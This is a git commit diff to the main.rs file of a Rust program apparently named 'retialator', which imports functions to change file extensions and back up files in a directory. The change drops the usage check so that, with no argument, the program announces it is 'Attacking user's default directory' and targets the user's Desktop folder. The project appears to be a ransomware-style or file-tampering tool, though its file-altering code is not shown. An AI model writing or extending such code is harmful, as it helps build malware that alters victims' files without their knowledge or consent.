d4860f4a14c08146db085fa160414f184bcfc730
Aashutosh Pudasaini <nepalidude3@gmail.com>
2024-02-01 15:25:57 +0545

    default user's desktop target system built

--- src/main.rs
+++ src/main.rs
@@ -1,15 +1,24 @@
 use std::env::args;
 use std::process;
 
+use platform_dirs::UserDirs;
 use retialator::{change_extension, create_backup, get_files_in_directory};
 fn main() {
     let arguments: Vec<String> = args().collect();
+    let directory_name: &str;
+    let user_directories = UserDirs::new().unwrap();
     if arguments.len() != 2 {
-        eprintln!("Usage : ./{} directory_name", arguments[0]);
-        process::exit(1);
+        println!("No Directory Supplied, Attacking user's default directory!");
+        directory_name = user_directories
+            .desktop_dir
+            .to_str()
+            .expect("Could not Get User Direcory");
+        // eprintln!("Usage : ./{} directory_name", arguments[0]);
+        // process::exit(1);
+    } else {
+        directory_name = arguments[1].as_str();
     }
-    let directory_name = arguments[1].as_str();
-
+    println!("{}", directory_name);
     let files = get_files_in_directory(directory_name).unwrap_or_else(|error| {
         eprintln!("{}", error);
         process::exit(1);
